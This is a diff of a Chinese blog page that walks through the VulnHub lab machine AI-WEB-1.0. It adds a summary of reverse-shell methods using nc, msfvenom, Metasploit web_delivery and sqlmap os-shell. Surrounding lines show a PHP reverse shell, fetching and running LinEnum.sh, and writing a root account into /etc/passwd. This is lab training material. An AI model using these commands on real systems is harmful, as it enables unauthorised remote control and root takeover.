@@ -29,7 +29,7 @@
 <meta property="og:image" content="/2020/02/12/AI-WEB-1.0——Workthrough/11.png">
 <meta property="og:image" content="/2020/02/12/AI-WEB-1.0——Workthrough/13.png">
 <meta property="og:image" content="/2020/02/12/AI-WEB-1.0——Workthrough/12.png">
-<meta property="og:updated_time" content="2020-02-13T06:09:17.334Z">
+<meta property="og:updated_time" content="2020-02-17T01:56:27.174Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AI-WEB-1.0——Workthrough">
 <meta name="twitter:description" content="0X01 靶机环境12攻击机：kali————192.168.0.110靶机：  AI-WEB-1.0————192.168.0.108  [靶机下载地址][https://www.vulnhub.com/entry/ai-web-1,353/]">
@@ -265,7 +265,16 @@
 <p>先修改IP地址, 该IP地址为攻击机IP地址</p>
 <p><img src="/2020/02/12/AI-WEB-1.0——Workthrough/9.png" alt="9"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php /root/shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 </li>
+</ul>
+</li>
+</ul>
+<ul>
 <li><p>新建终端,监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
 
@@ -273,26 +282,98 @@
 <p><img src="/2020/02/12/AI-WEB-1.0——Workthrough/10.png" alt="10"></p>
 </li>
 <li><p>得到反弹后,开始提权操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#模拟终端</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">#进入有写权限的tmp目录</span><br><span class="line">cd /tmp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  #模拟终端</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">  #进入有写权限的tmp目录</span><br><span class="line">cd /tmp</span><br></pre></td></tr></table></figure>
+
+
 </li>
+</ul>
+<ul>
 <li><p>再新建一个终端, 开启python的一句话建议http服务, 用来将<code>LinEnum.sh</code>传输给靶机</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/02/12/AI-WEB-1.0——Workthrough/11.png" alt="11"></p>
 </li>
 <li><p>回到反弹shell的终端, wget获取提权脚本<code>LinEnum.sh</code>, 并运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.13.132:8000/LinEnum.sh</span><br><span class="line">chmod 777 LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.13.132:8000/LinEnum.sh</span><br><span class="line">  chmod 777 LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>现在,我们可以创建具有root权限的账户了, 也具有写入/etc/passwd的权限</p>
 <p>先打开一个终端, 生成密码的hash值, 密码为<code>pass123</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt user3 pass123</span><br></pre></td></tr></table></figure>
+
+
 </li>
+</ul>
+<ul>
 <li><p>回到反弹shell的终端, 创建账户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#根据/etc/passwd文件的格式写入账户和密码, 账户为test;密码为pass123</span><br><span class="line">echo &apos;test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash&apos; &gt;&gt;/etc/passwd</span><br><span class="line">#查看是否写入成功</span><br><span class="line">tail /etc/passwd</span><br><span class="line">#切换用户</span><br><span class="line">su test</span><br><span class="line">#进入root目录查看flag文件</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  #根据/etc/passwd文件的格式写入账户和密码, 账户为test;密码为pass123</span><br><span class="line">  echo &apos;test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash&apos; &gt;&gt;/etc/passwd</span><br><span class="line">  #查看是否写入成功</span><br><span class="line">  tail /etc/passwd</span><br><span class="line">  #切换用户</span><br><span class="line">  su test</span><br><span class="line">  #进入root目录查看flag文件</span><br><span class="line">cd /root</span><br><span class="line">  ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/02/12/AI-WEB-1.0——Workthrough/13.png" alt="13"></p>
 <p>切换用户,并查看flag文件</p>
 <p><img src="/2020/02/12/AI-WEB-1.0——Workthrough/12.png" alt="12"></p>
+</li>
+</ul>
+<h3 id="0X03-总结几种监听shell的方式"><a href="#0X03-总结几种监听shell的方式" class="headerlink" title="0X03 总结几种监听shell的方式"></a>0X03 总结几种监听shell的方式</h3><ul>
+<li><p>nc监听</p>
+<ul>
+<li><p>生成shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php /root/shell.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>新建终端,监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>访问shell.php, 反弹到攻击机</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><code>msf</code>与SQLmap的<code>os-shell</code>联动</p>
+<ul>
+<li><p>打开一个终端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">exploit(multi/script/web_delivery) &gt; set lhost 192.168.13.132</span><br><span class="line">exploit(multi/script/web_delivery) &gt; set srvport 4567</span><br><span class="line">exploit(multi/script/web_delivery) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><code>msf</code>会生成一串代码,  这串代码要到<code>os-shell</code>上运行</p>
+</li>
+<li><p>在SQLmap的<code>os-shell</code>运行代码</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>在<code>msf</code>中进入会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session 1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<ul>
+<li><p><code>nc</code>与<code>msfvenom</code>和<code>os-shell</code>联动</p>
+<ul>
+<li><p><code>msfvenom</code>形成执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.13.132 lport=9876 R</span><br></pre></td></tr></table></figure>
+
+<p>拷贝形成的代码</p>
+</li>
+<li><p>nc监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9876</span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在SQLmap的<code>os-shell</code>运行代码</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><code>msf</code>与<code>msfvenom</code>联动</p>
+<ul>
+<li><p><code>msfvenom</code>形成执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.13.132 lport=9876 R</span><br></pre></td></tr></table></figure>
+
+<p>拷贝形成的代码</p>
+</li>
+<li><p>新建终端, <code>msf</code>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload cmd/unix/reverse_python</span><br><span class="line">set lhost 192.168.13.132</span><br><span class="line">set lport 9876</span><br><span class="line">exploit</span><br><span class="line">sessions -u 1</span><br><span class="line">sessions 2</span><br><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+
+
 </li>
 </ul>
 </li>
@@ -554,15 +635,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
               </li>
              
               <li class="article-tag-list-item">
